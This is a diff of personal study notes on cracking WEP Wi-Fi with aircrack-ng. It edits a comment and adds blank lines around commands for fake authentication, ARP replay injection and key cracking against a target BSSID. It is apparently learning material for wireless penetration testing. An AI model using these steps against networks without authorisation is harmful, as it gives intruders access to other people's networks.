@@ -31,7 +31,7 @@
     
     # 2. Split another terminal 
     aireplay-ng --fakeauth 0 -a [bssid] -h [interface bssid] [interface name]
-    # 1) Putting 0 because I only want to do this once
+    # 1) number 0 means the time to wait between association attempts, putting 0 because I only want to do this once
     # 2) bssid is the MAC Address of the target
     # 3) -h is to specify the MAC address of my interface
     # 4) to get the interface id, we need to aplit another terminal window and the first 12 digits of the unspec field is the bssid(MAC Address of the interface) replace the minus with colons
@@ -49,15 +49,18 @@
     2. In practice
     ```
     # 1. Associate with the target network with the process in 3
+
     airodump-ng --bssid [bssid] --channel [channel] --write arpreplay (-D) [interface name]
     # Split the terminal
     aireplay-ng --fakeauth 0 -a [bssid] -h [interface bssid] [interface name]
 
     # 2. Conduct an ARP Attack similar as above(Similar to the fakeauth attack)(Split the terminal)
+
     aireplay-ng --arpreplay -b [bssid] -h [interface bssid] [interface name]
     # just wait until an arp packet exists
 
     # 3. Crack it
+    
     aircrack-ng arpreplay.cap
     # can check the name of the foler by using ls command
     ```
